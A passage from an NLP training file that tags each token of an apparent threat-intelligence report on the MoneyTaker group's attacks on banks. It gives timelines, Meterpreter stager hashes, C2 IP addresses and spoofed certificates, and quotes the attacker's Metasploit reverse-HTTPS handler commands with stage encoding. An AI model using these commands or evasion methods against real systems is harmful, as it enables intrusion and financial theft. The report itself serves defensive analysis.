1.1.9.4	CD	X	O
was	VBD	00100010	O
used	VBN	0011011100	O
.	.	0110	O

This	DT	0100110	O
version	NN	1011011011	O
was	VBD	00100010	O
available	JJ	00110111101	O
back	RB	10011010	O
in	IN	0001110	O
2013	CD	0011111010	O
.	.	0110	O

The	DT	010010	B-Entity
current	JJ	1101110111	I-Entity
version	NN	1011011011	I-Entity
of	IN	00010	I-Entity
this	DT	1111110	I-Entity
remote	NN	11010101111	I-Entity
access	NN	10011011	I-Entity
tool	NN	101001001	I-Entity
was	VBD	00100010	I-Entity
1.2.0.6	CD	X	I-Entity
at	IN	000111111110	I-Entity
the	DT	111110	I-Entity
time	NN	1010111110	I-Entity
of	IN	00010	I-Entity
attacks	NNS	101110000	I-Entity
in	IN	0001110	I-Entity
Russia	NNP	0011111011	I-Entity
and	CC	00001101	I-Entity
the	DT	111110	I-Entity
US	NNP	110111110	I-Entity
.	.	0110	O

6	CD	001111100111	O
Software	NNP	0111000	O
&	CC	01110010	O
service	NN	101101111011	O
provider	NN	10111110110	O
,	,	00000	O
UK	NNP	110111110	O
US	NNP	110111110	O
Financial	NNP	X	O
Services	NNPS	0111000	O
Provider	NN	X	O
(	(	0111101110	O
Breach	NNP	X	O
not	RB	00101110	O
confirmed	VBD	00110110010	O
)	)	01111000	O
Bank	NNP	000010111	O
,	,	00000	O
Russia	NNP	0011111011	O
Bank	NNP	000010111	O
,	,	00000	O
Russia	NNP	0011111011	O
AWS	NNP	X	O
CBR	NNP	X	O
2016	CD	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
First	NNP	010110	O
Data	NNP	0111000	O
STAR	NNP	X	O
JANUARY	NN	X	O
FEBRUARY	NN	X	O
MARCH	NN	X	O
APRIL	NN	X	O
MAY	NNP	X	O
JUNE	NN	X	O
JULY	NN	X	O
AUGUST	NNP	X	O
SEPTEMBER	NN	X	O
OCTOBER	NN	X	O
NOVEMBER	NN	X	O
DECEMBER	NN	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
UT	NNP	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
NY	NNP	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
VA	NNP	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
CO	NNP	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
FL	NNP	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
SC	NNP	X	O
Credit	NNP	X	O
Union	NNP	1011100011	O
,	,	00000	O
USA	NNP	0011111011	O
2017	CD	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
IL	NNP	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
IL	NNP	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
WI	NNP	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
OK	NNP	0111011110	O
Bank	NNP	000010111	O
,	,	00000	O
Russia	NNP	0011111011	O
AWS	NNP	X	O
CBR	NNP	X	O
JANUARY	NN	X	O
FEBRUARY	NN	X	O
MARCH	NN	X	O
APRIL	NN	X	O
MAY	NNP	X	O
JUNE	NN	X	O
JULY	NN	X	O
AUGUST	NNP	X	O
SEPTEMBER	NN	X	O
OCTOBER	NN	X	O
NOVEMBER	NN	X	O
DECEMBER	NN	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
MO	NNP	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
CA	NNP	X	O
Law	NNP	X	O
Firm	NN	X	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
NC	NNP	X	O
Bank	NNP	000010111	O
,	,	00000	O
USA	NNP	0011111011	O
,	,	00000	O
CA	NNP	X	O
Timeline	NN	X	O
of	IN	00010	O
initial	JJ	1100101101	O
infections	NNS	10111111001	O
in	IN	0001110	O
attacks	NNS	101110000	O
:	:	O	O
•	IN	0111110111	O
The	DT	010010	O
very	RB	111000	O
first	JJ	1100000	O
attack	NN	1010110101	O
,	,	00000	O
which	WDT	00101011	O
Group-IB	NNP	X	O
attributes	VBZ	10111111100	O
to	TO	000110	O
MoneyTaker	NNP	X	O
was	VBD	00100010	O
conducted	VBN	0011011101010	O
in	IN	0001110	O
the	DT	111110	O
spring	NN	X	O
of	IN	00010	O
2016	CD	X	O
,	,	00000	O
when	WRB	0011101111100	O
funds	NNS	X	O
were	VBD	00100000	O
stolen	VBN	110011110	O
from	IN	00011110110	O
a	DT	11110	O
US	NNP	110111110	O
bank	NN	101010110	O
by	IN	000111110	O
gaining	VBG	11010101111	O
access	NN	10011011	O
to	TO	000110	O
First	NNP	010110	O
Data	NNP	0111000	O
’	NNP	X	O
s	NN	011101011	O
STAR	NNP	X	O
card	NN	10011001	O
processing	NN	1010110111	O
system	NN	101010001	O
.	.	0110	O

•	NN	0111110111	O
•	NN	0111110111	O
•	NN	0111110111	O
In	IN	01011100	O
September	NNP	001111010	O
2016	CD	X	O
,	,	00000	O
Group-IB	NNP	X	O
tracked	VBD	00110110010	O
several	JJ	11101100	O
attacks	NNS	101110000	O
on	IN	0001111110	O
banks	NNS	101110010	O
in	IN	0001110	O
Russia	NNP	0011111011	O
.	.	0110	O

The	DT	010010	O
main	JJ	11000110	O
target	NN	101010110	O
was	VBD	00100010	O
the	DT	111110	O
AWS	NNP	X	O
CBR	NNP	X	O
(	(	0111101110	O
Automated	NNP	X	O
Work	NNP	1101010011	O
Station	NNP	X	O
Client	NNP	X	O
of	IN	00010	O
the	DT	111110	O
Russian	JJ	110111010	O
Central	NNP	00111111100	O
Bank	NNP	000010111	O
)	)	01111000	O
,	,	00000	O
a	DT	11110	B-Entity
Russian	JJ	110111010	I-Entity
interbank	NN	X	I-Entity
fund	NN	X	I-Entity
transfer	NN	00111001111	I-Entity
system	NN	101010001	I-Entity
similar	JJ	001100111	I-Entity
to	TO	000110	I-Entity
SWIFT	NNP	X	I-Entity
.	.	0110	O

After	IN	01011101	O
a	DT	11110	O
successful	JJ	1100111010	O
theft	NN	101011000	O
from	IN	00011110110	O
one	CD	11101000	O
of	IN	00010	O
the	DT	111110	O
attacked	JJ	101010101	O
banks	NNS	101110010	O
,	,	00000	O
the	DT	111110	O
incidents	NNS	10111001111	O
stopped	VBD	0011011000	O
,	,	00000	O
similar	JJ	001100111	O
to	TO	000110	O
the	DT	111110	O
case	NN	1010111101	O
of	IN	00010	O
theft	NN	101011000	O
in	IN	0001110	O
the	DT	111110	O
United	NNP	11000100	O
States	NNPS	101111010	O
.	.	0110	O

In	IN	01011100	O
November	NNP	001111010	O
2016	CD	X	O
,	,	00000	O
attackers	NNS	10100000	O
deployed	VBD	0011011101111	O
new	JJ	11001101111	O
infrastructure	NN	1011111001	O
,	,	00000	O
which	WDT	00101011	O
was	VBD	00100010	O
then	RB	001011111011	O
used	VBN	0011011100	O
to	TO	000110	O
attack	VB	1010110101	O
banks	NNS	101110010	O
in	IN	0001110	O
the	DT	111110	O
United	NNP	11000100	O
States	NNPS	101111010	O
.	.	0110	O

The	DT	010010	O
last	JJ	11000100	O
activity	NN	101110111111	O
in	IN	0001110	O
this	DT	1111110	O
wave	NN	101011101	O
of	IN	00010	O
attacks	NNS	101110000	O
was	VBD	00100010	O
tracked	VBN	00110110010	O
in	IN	0001110	O
June	NNP	001111010	O
2017	CD	X	O
.	.	0110	O

In	IN	01011100	O
November	NNP	001111010	O
2017	CD	X	O
,	,	00000	O
we	PRP	00101000	O
observed	VBD	00110110011	O
a	DT	11110	O
new	JJ	11001101111	O
successful	JJ	1100111010	O
attack	NN	1010110101	O
by	IN	000111110	O
this	DT	1111110	O
group	NN	1011101001	O
in	IN	0001110	O
Russia	NNP	0011111011	O
.	.	0110	O

Like	IN	01011100	O
in	IN	0001110	O
2016	CD	X	O
,	,	00000	O
they	PRP	0010100100	O
managed	VBD	001100101	O
to	TO	000110	O
steal	VB	00111001111	O
funds	NNS	X	O
through	IN	00011111110110	O
the	DT	111110	O
interbank	NN	X	O
transfers	NNS	1011010010	O
system	NN	101010001	O
.	.	0110	O

7	CD	001111100111	O
02	CD	X	O
ATTACK	NN	X	O
INFRASTRUCTURE	NN	X	O
To	TO	01011101	O
conduct	VB	00111001110	O
targeted	JJ	110011100	O
attacks	NNS	101110000	O
,	,	00000	O
hackers	NNS	10111001111	O
use	VBP	10010110	O
a	DT	11110	O
distributed	JJ	0011011101010	O
infrastructure	NN	1011111001	O
that	WDT	00001111	O
is	VBZ	00100011	O
difficult	JJ	001100110	O
to	TO	000110	O
track	VB	0011100110	O
.	.	0110	O

A	DT	0100111	O
rather	RB	0111101111110	O
unique	JJ	1100110110	O
feature	NN	101001000	O
of	IN	00010	O
the	DT	111110	O
infrastructure	NN	1011111001	O
is	VBZ	00100011	O
the	DT	111110	O
presence	NN	1000111	O
of	IN	00010	O
a	DT	11110	O
Persistence	NN	0100111	O
server	NN	10110001	O
,	,	00000	O
which	WDT	00101011	O
delivers	VBZ	0011101001	O
the	DT	111110	O
payload	NN	1010011011	O
only	RB	001011111001	O
to	TO	000110	O
real	JJ	110011000	O
victims	NNS	10111001110	O
whose	WP$	000010011	O
IP	NNP	110100110	O
addresses	NNS	10110010	O
are	VBP	00100001	O
added	VBN	001101110110	O
to	TO	000110	O
the	DT	111110	O
whitelist	NN	X	O
.	.	0110	O

1	CD	00111110010	B-Entity
2	CD	00111110010	I-Entity
3	CD	00111110010	I-Entity
4	CD	001111100111	I-Entity
5	CD	001111100111	I-Entity
Stager	NNP	X	I-Entity
request	NN	10110110011	I-Entity
payload	NN	1010011011	I-Entity
Payload	NN	0100111	I-Entity
Setup	NNP	X	I-Entity
encrypted	VBD	1100111110	I-Entity
tunnel	NN	101101111010	I-Entity
with	IN	000111100	I-Entity
backconnect	NN	X	I-Entity
Request	NNP	01111011110	I-Entity
stager	NN	X	I-Entity
after	IN	00011111110111	B-Preposition
reboot	NN	1010111110	B-Entity
Response	NN	0111000	I-Entity
with	IN	000111100	I-Entity
stager	NN	X	I-Entity
if	IN	001110111100	I-Entity
IP	NNP	110100110	I-Entity
in	IN	0001110	I-Entity
whitelist	NN	X	I-Entity
Pentest	NNP	X	I-Entity
framework	NN	101001000	I-Entity
and	CC	00001101	I-Entity
backconnect	VB	X	I-Entity
server	NN	10110001	I-Entity
Persistence	NN	0100111	I-Entity
server	NN	10110001	I-Entity
(	(	0111101110	I-Entity
response	NN	10110110011	I-Entity
to	TO	000110	I-Entity
whitelisted	VBN	X	I-Entity
IPs	NNP	10111111010	I-Entity
)	)	01111000	I-Entity
VICTIM	NN	X	I-Entity
Pentest	NNP	X	I-Entity
framework	NN	101001000	I-Entity
server	NN	10110001	I-Entity
This	DT	0100110	I-Entity
server	NN	10110001	I-Entity
is	VBZ	00100011	O
used	VBN	0011011100	O
to	TO	000110	O
perform	VB	0011100101	O
the	DT	111110	O
main	JJ	11000110	O
activity	NN	101110111111	O
.	.	0110	O

On	IN	01011101	O
it	PRP	00101010	O
,	,	00000	O
hackers	NNS	10111001111	O
install	VB	00111001110	O
a	DT	11110	O
legitimate	JJ	110010011	O
tool	NN	101001001	O
for	IN	0001111010	O
penetration	NN	1110101111	O
testing	VBG	10111111110	O
-	:	01111011110	O
Metasploit	NN	101010111	O
to	TO	000110	O
further	RB	1100101011	O
control	VB	1101000	O
the	DT	111110	O
full	JJ	110011000	O
attack	NN	1010110101	O
.	.	0110	O

8	CD	001111100111	O
Name	NN	0111111110	O
asys.exe	NN	X	O
launch-paranoid-	NN	X	O
stageless3.exe	NN	X	O
SHA256	NN	011111111111	O
Type	NN	011101100	O
6ce7c4cb9e51116a4565e9b2e129335a4d23cfc51a32080aa9f25689cb1c6ef2	CD	X	O
Meterpreter	NN	X	O
f98b0220a11b57e3c812e7f86f5e5c3f8bbdb5d5ce9dc7b721e28a7f28ecb1ef	NN	X	O
Meterpreter	NN	X	O
msc.exe	NN	X	O
,	,	00000	O
msc3.exe	NN	X	B-Entity
0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff	CD	X	I-Entity
Meterpreter	NN	X	I-Entity
msc4.exe	NN	X	I-Entity
msc5.exe	NN	X	I-Entity
msc6.exe	NN	X	I-Entity
msc7.exe	NN	X	I-Entity
cmd.exe	NN	011111110	I-Entity
53c789565821b6eb64bd7f002e38b8259bde3bbbb39798c82657b2b5d59bcd9f	CD	X	I-Entity
Meterpreter	NN	X	I-Entity
98fb846df3687b3c9c7fa66f39d6c70948e8330489be7c787e1f2c3b23f8d205	CD	X	I-Entity
Meterpreter	NN	X	I-Entity
92afe22f494a849345b18d2b302e71a4336871a7956795a7188280e4c7bd8607	CD	X	I-Entity
Meterpreter	NN	X	I-Entity
73b8ed8f14ec2260ae332603f723a5eb0a52c4c997454904e3d5ff254a27a6e6	CD	X	I-Entity
Meterpreter	NN	X	I-Entity
7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f	CD	X	I-Entity
Meterpreter	NNP	X	I-Entity
stager	NN	X	I-Entity
mencstager.exe	NN	X	I-Entity
7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f	CD	X	I-Entity
Meterpreter	NNP	X	I-Entity
stager	NN	X	I-Entity
msdefender.bat	NN	X	I-Entity
8cfeb71eaaa3df217e15a449bc4656841b58a4737760d956b1c8e6039cff61e6	CD	X	I-Entity
Meterpreter	NNP	X	I-Entity
stager	NN	X	I-Entity
se.vbs	NN	X	I-Entity
rc4.dll	NN	X	I-Entity
rc4.exe	NN	X	I-Entity
rc4.hta	NN	X	I-Entity
ff999c968bce81987cab47a02a3b176042489d82644d4c6fb13d5c8c1244cbcc	NN	X	I-Entity
Meterpreter	NNP	X	I-Entity
stager	NN	X	I-Entity
8a0be0a97ba19d4498b58365d36ba5461039e41f73bbd745b15b80fc21e38c3f	CD	X	I-Entity
Meterpreter	NNP	X	I-Entity
stager	NN	X	I-Entity
a7035c20c32ad4cd1cc76b211f6258fc5858e4bc43031d04e3655b38b666c0c4	NN	X	I-Entity
Meterpreter	NNP	X	I-Entity
stager	NN	X	I-Entity
72ee03b51544002df3e25d1a730e650389bdbd5f1cff91488ed9e05944b3cb52	CD	X	I-Entity
Meterpreter	NNP	X	I-Entity
stager	NN	X	I-Entity
proxystager.bat	NN	X	I-Entity
3a163bb0a8abe244815836a05fab48b640ec537bd76c92b7857db18657d2a774	CD	X	I-Entity
Meterpreter	NNP	X	I-Entity
stager	NN	X	I-Entity
ps.bat	NN	X	I-Entity
9e9149ae6092c4a5bd4cb36cf40ec660e3ee10e76834340bf1234186315ca808	CD	X	I-Entity
Meterpreter	NNP	X	I-Entity
stager	NN	X	I-Entity
When	WRB	01011111	I-Entity
the	DT	111110	I-Entity
payload	NN	1010011011	I-Entity
(	(	0111101110	O
Meterpreter	NNP	X	O
)	)	01111000	O
runs	VBZ	0011101000	O
on	IN	0001111110	O
a	DT	11110	O
compromised	JJ	101010101	O
host	NN	101101111010	O
,	,	00000	O
it	PRP	00101010	O
initiates	NNS	0011101001	O
outbound	RP	1101011110	O
SSL	NNP	110010100	O
connections	NNS	101111101111	O
which	WDT	00101011	O
helps	VBZ	00111010110	O
to	TO	000110	O
avoid	VB	0011100110	O
detection	NN	101011000	O
of	IN	00010	O
suspicious	JJ	110010010	O
connections	NNS	101111101111	O
by	IN	000111110	O
network	NN	101010010	O
security	NN	11011000	O
systems	NNS	1011111000	O
.	.	0110	O

Below	NNP	0101011	O
is	VBZ	00100011	O
code	NN	101001100	O
executed	VBD	00110111100	O
within	IN	00011111111111	O
the	DT	111110	O
Metasploit	NNP	101010111	O
console	NN	101101111011	O
by	IN	000111110	O
the	DT	111110	B-Entity
attacker	NN	101000010	I-Entity
:	:	O	I-Entity
use	NN	10010110	I-Entity
exploit/multi/handler	NN	X	I-Entity
set	VBN	100000	I-Entity
PAYLOAD	NNP	X	I-Entity
windows/meterpreter/reverse	JJ	X	I-Entity
_	NNP	X	I-Entity
https	NN	X	I-Entity
set	VBN	100000	I-Entity
LHOST	NNP	X	I-Entity
_	NNP	X	I-Entity
c2serverIP	NN	X	I-Entity
_	NN	X	I-Entity
set	VBN	100000	I-Entity
LPORT	NNP	X	I-Entity
443	CD	1011101110	I-Entity
set	VBN	100000	I-Entity
HandlerSSLCert	NNP	X	I-Entity
/root/.msf4/loot/20161031010327	NNP	X	I-Entity
_	NN	X	I-Entity
default	NN	1101010000	I-Entity
_	$	X	I-Entity
46.228.47.114	CD	X	I-Entity
_	NNP	X	I-Entity
www.yahoo.com	NN	X	I-Entity
_	NNP	X	I-Entity
pe	NN	X	I-Entity
_	VBD	X	I-Entity
399345.pem	CD	X	I-Entity
set	VBN	100000	I-Entity
StagerVerifySSLCert	NNP	X	I-Entity
true	JJ	110111111	I-Entity
set	VBN	100000	I-Entity
EnableStageEncoding	NNP	X	I-Entity
true	JJ	110111111	I-Entity
set	VBN	100000	I-Entity
StageEncoder	NNP	X	I-Entity
x86/shikata	NNP	X	I-Entity
_	NNP	X	I-Entity
ga	NN	X	I-Entity
_	NNP	X	I-Entity
nai	NN	X	I-Entity
set	VBN	100000	O
ExitOnSession	NNP	X	O
false	JJ	110010011	O
By	IN	01011101	O
default	NN	1101010000	O
,	,	00000	O
Metasploit	NNP	101010111	O
generates	VBZ	0011101001	O
self-signed	JJ	X	O
SSL	NNP	110010100	O
certificates	NNS	10111111010	O
and	CC	00001101	O
specifies	NNS	001110101110	O
random	VBP	110011000	O
values	NNS	10111111100	O
in	IN	0001110	O
the	DT	111110	O
following	JJ	11000111	O
fields	NNS	10111111100	O
:	:	O	O
Valid	NNP	X	O
from	IN	00011110110	O
,	,	00000	O
Valid	NNP	X	O
till	NN	0111101111110	O
,	,	00000	O
Common	NNP	110111101	O
name	NN	1011010000	O
.	.	0110	O

Such	JJ	0100010	O
certificates	NNS	10111111010	O
can	MD	001001011	O
also	RB	0010111100	O
cause	VB	0011100101	O
suspicion	NN	101011000	O
.	.	0110	O

9	CD	001111100111	O
In	IN	01011100	O
order	NN	001111011	O
to	TO	000110	O
avoid	VB	0011100110	O
detection	NN	101011000	O
,	,	00000	O
the	DT	111110	O
MoneyTaker	NNP	X	O
group	NN	1011101001	O
generates	VBZ	0011101001	O
self-	JJ	X	O
signed	VBN	0011010111	O
SSL	NNP	110010100	O
certificates	NNS	10111111010	O
before	IN	0011101111101	O
the	DT	111110	O
attack	NN	1010110101	O
,	,	00000	O
indicating	VBG	0011101010	O
the	DT	111110	O
names	NNS	1011010001	O
of	IN	00010	O
popular	JJ	1100110100	O
brands	NNS	X	O
in	IN	0001110	O
the	DT	111110	O
fields	NNS	10111111100	O
,	,	00000	O
instead	RB	1000111	O
of	IN	00010	O
filling	VBG	X	O
them	PRP	10011110	O
out	RP	10011000	O
randomly	RB	0011111110111	O
.	.	0110	O

Group-IB	JJ	X	O
specialists	NNS	X	O
have	VBP	00100110	O
discovered	VBN	00110110010	O
the	DT	111110	O
use	NN	10010110	O
of	IN	00010	O
the	DT	111110	O
following	VBG	11000111	O
certificates	NNS	10111111010	O
:	:	O	O
Issuer	NN	X	O
SSL	NNP	110010100	O
fingerprint	NN	1011010011	O
IP	NNP	110100110	O
,	,	00000	O
where	WRB	001110110111	O
SSL	NNP	110010100	B-Entity
was	VBD	00100010	I-Entity
used	VBN	0011011100	I-Entity
MetaBank	NNP	X	I-Entity
LTD	NNP	X	I-Entity
8b7fa4ef88a303bb47240c9b8012c80507074f2e	CD	X	I-Entity
83.220.172.71	CD	X	I-Entity
Yahoo	NNP	110111110	I-Entity
Inc	NNP	101101010	I-Entity
.	.	0110	I-Entity
c29d79df9b5416fd416c31e57cd525dfc23a8f66	NN	X	I-Entity
37.46.133.190	CD	X	I-Entity
172.86.121.11	CD	X	I-Entity
Fiserv	NNP	X	I-Entity
Inc	NNP	101101010	I-Entity
Microsoft	NNP	0011111110110	I-Entity
Ltd	NNP	X	I-Entity
b3dd855fc1b32757bde5c9f737808f150d6f57e6	NN	X	I-Entity
146.185.243.19	CD	X	I-Entity
98cbe44e1a30448a3ff6be38e8b277ae189f9b45	CD	X	I-Entity
82.146.54.5	CD	X	I-Entity
Federal	NNP	000010110	I-Entity
Reserve	NNP	X	I-Entity
Bank	NNP	000010111	I-Entity
5fe7f5924ee2382dbfa5c8bdc6d04f0ff5d9273a	CD	X	I-Entity
188.120.235.201	CD	X	I-Entity
Bank	NNP	000010111	I-Entity
of	IN	00010	I-Entity
America	NNP	000010111	I-Entity
5922a06f03f6464921462c07842afb18da1577e9	CD	X	I-Entity
188.120.230.218	CD	X	I-Entity
188.120.230.235	CD	X	I-Entity
VMware	NN	X	I-Entity
7aa02d827609e0b6b3dca6d0ef82fe3a1fbe1d67	CD	X	I-Entity
185.141.25.222	CD	X	I-Entity
Persistence	NN	0100111	I-Entity
server	NN	10110001	I-Entity
Hackers	NNS	X	I-Entity
try	VBP	00110001	I-Entity
to	TO	000110	I-Entity
stay	VB	00111001110	I-Entity
as	RB	00001110	I-Entity
inconspicuous	JJ	X	I-Entity
as	IN	00001110	I-Entity
possible	JJ	001100110	I-Entity
,	,	00000	I-Entity
and	CC	00001101	I-Entity
therefore	RB	001011111011	I-Entity
they	PRP	0010100100	I-Entity
use	VBP	10010110	I-Entity
‘	JJ	X	I-Entity
fileless	NN	X	I-Entity
’	NNP	X	I-Entity
malware	NN	10100010	I-Entity
which	WDT	00101011	O
only	RB	001011111001	O
exists	VBZ	1011011000	O
in	IN	0001110	O
RAM	NNP	X	O
and	CC	00001101	O
is	VBZ	00100011	O
destroyed	VBN	00110110110	O
after	IN	00011111110111	O
reboot	NN	1010111110	O
.	.	0110	O

That	DT	0100110	O
said	VBD	10010011	O
,	,	00000	O
PowerShell	NNP	X	O
and	CC	00001101	O
VBS	NNP	X	O
scripts	NNS	10111111011	O
help	VBP	100101111	O
them	PRP	10011110	O
to	TO	000110	O
ensure	VB	001110000	O
persistence	NN	101011000	O
in	IN	0001110	O
the	DT	111110	O
system	NN	101010001	O
.	.	0110	O

Scripts	NNP	X	O
provide	VBP	0011100101	O
the	DT	111110	O
following	JJ	11000111	O
benefits	NNS	101111011	O
for	IN	0001111010	O
attackers	NNS	10100000	O
:	:	O	O
•	RB	0111110111	O
Malicious	JJ	0100010	O
scripts	NNS	10111111011	O
are	VBP	00100001	O
hard	JJ	001100110	O
to	TO	000110	O
detect	VB	0011100110	O
by	IN	000111110	O
means	NNS	10010011	O
of	IN	00010	O
antivirus	NN	11011000	O
protection	NN	101011000	O
.	.	0110	O

Writing	VBG	X	O
a	DT	11110	O
signature	NN	101001001	O
for	IN	0001111010	O
a	DT	11110	O
script	NN	101101111011	O
without	IN	0011101111110	O
false	JJ	110010011	O
positives	NNS	X	O
is	VBZ	00100011	O
much	RB	110011001	O
more	RBR	1110010	O
difficult	JJ	001100110	O
than	IN	001111111100	O
a	DT	11110	O
binary	JJ	1010001100	O
file	NN	10110111110	O
.	.	0110	O

•	NN	0111110111	O
Scripts	NNS	X	O
are	VBP	00100001	O
easy	JJ	1100111111	O
to	TO	000110	O
modify	VB	0011100110	O
,	,	00000	O
which	WDT	00101011	O
makes	VBZ	00111010110	O
it	PRP	00101010	O
easier	JJR	001100110	O
for	IN	0001111010	O
attackers	NNS	10100000	O
to	TO	000110	O
work	VB	100101111	O
.	.	0110	O

•	NN	0111110111	O
It	PRP	0101010	O
is	VBZ	00100011	O
easy	JJ	1100111111	O
to	TO	000110	O
ensure	VB	001110000	O
persistence	NN	101011000	O
.	.	0110	O

Typically	RB	010110	O
,	,	00000	O
such	JJ	001111111110	O
scripts	NNS	10111111011	O
are	VBP	00100001	O
stored	VBN	00110110111	O
in	IN	0001110	O
the	DT	111110	O
registry	NN	1101010000	O
or	CC	00001100	O
are	VBP	00100001	O
called	VBN	0011010110	O
when	WRB	0011101111100	O
certain	JJ	111011110	O
events	NNS	101110010	O
occur	VBP	00110001	O
through	IN	00011111110110	O
Windows	NNP	110101110	O
Management	NNP	0111000	O
Instrumentation	NNP	X	O
(	(	0111101110	O
WMI	NNP	011111110	O
)	)	01111000	O
,	,	00000	O
Group	NNP	001111001	O
Policy	NN	0111000	O
Objects	NNP	X	O
(	(	0111101110	O
GPOs	NNP	X	O
)	)	01111000	O
,	,	00000	O
Scheduled	VBN	X	O
task	NN	101110111110	O
.	.	0110	O

Such	JJ	0100010	O
scripts	NNS	10111111011	O
are	VBP	00100001	O
very	RB	111000	O
simple	NN	1100110100	O
and	CC	00001101	O
usually	RB	00101111010	O
their	PRP$	1111111110	O
main	JJ	11000110	O
task	NN	101110111110	O
is	VBZ	00100011	O
to	TO	000110	O
download	VB	00111001111	O
the	DT	111110	O
main	JJ	11000110	O
program	NN	1010011010	O
from	IN	00011110110	O
an	DT	11111110	O
external	JJ	1100101010	O
or	CC	00001100	O
local	JJ	1101110111	O
source	NN	1010011110	O
and	CC	00001101	O
run	VB	00111001110	O
it	PRP	00101010	O
.	.	0110	O

10	CD	001111100110	O
The	DT	010010	O
Persistence	NNP	0100111	O
server	NN	10110001	O
is	VBZ	00100011	O
used	VBN	0011011100	O
to	TO	000110	O
force	VB	10010100	O
a	DT	11110	O
malicious	JJ	110010010	O
file	NN	10110111110	O
to	TO	000110	O
be	VB	00101100	O
launched	VBN	00110111100	O
if	IN	001110111100	O
the	DT	111110	O
attacked	VBN	101010101	O
computer	NN	101010000	O
has	VBZ	001001110	O
been	VBN	00101101	O
rebooted	VBN	00110111100	O
.	.	0110	O

A	DT	0100111	B-Entity
distinctive	JJ	11001101110	I-Entity
feature	NN	101001000	I-Entity
of	IN	00010	I-Entity
this	DT	1111110	I-Entity
group	NN	1011101001	I-Entity
is	VBZ	00100011	B-Verb
the	DT	111110	B-Entity
use	NN	10010110	I-Entity
of	IN	00010	I-Entity
a	DT	11110	I-Entity
separate	JJ	11001101111	I-Entity
server	NN	10110001	I-Entity
for	IN	0001111010	I-Entity
this	DT	1111110	I-Entity
goal	NN	1000111	I-Entity
.	.	0110	O

On	IN	01011101	O
the	DT	111110	O
server	NN	10110001	O
,	,	00000	O
they	PRP	0010100100	O
run	VBP	00111001110	O
a	DT	11110	O
script	NN	101101111011	O
that	WDT	00001111	O
performs	VBZ	0011101001	O
two	CD	11101101	O
checks	NNS	0011101000	O
:	:	O	O
1	CD	00111110010	O
.	.	0110	O

Checks	NNS	X	O
if	IN	001110111100	O
the	DT	111110	O
User-agent	JJ	X	O
field	NN	10110111000	O
is	VBZ	00100011	O
equal	JJ	001100111	O
to	TO	000110	O
WinHttp	NNP	X	O
.	.	0110	O

If	IN	01011111	O
it	PRP	00101010	O
is	VBZ	00100011	O
not	RB	00101110	O
equal	JJ	001100111	O
,	,	00000	O
requests	NNS	1011011000	O
are	VBP	00100001	O
sent	VBN	001101110110	O
back	RB	10011010	O
to	TO	000110	O
the	DT	111110	O
web	NN	11010101110	O
server	NN	10110001	O
with	IN	000111100	O
a	DT	11110	O
404	CD	X	O
error	NN	1010011110	O
code	NN	101001100	O
(	(	0111101110	O
page	NN	10110111010	O
not	RB	00101110	O
found	VBN	0011011000	O
)	)	01111000	O
.	.	0110	O

If	IN	01011111	O
equal	JJ	001100111	O
to	TO	000110	O
WinHttp	NNP	X	O
,	,	00000	O
it	PRP	00101010	O
performs	VBZ	0011101001	O
the	DT	111110	O
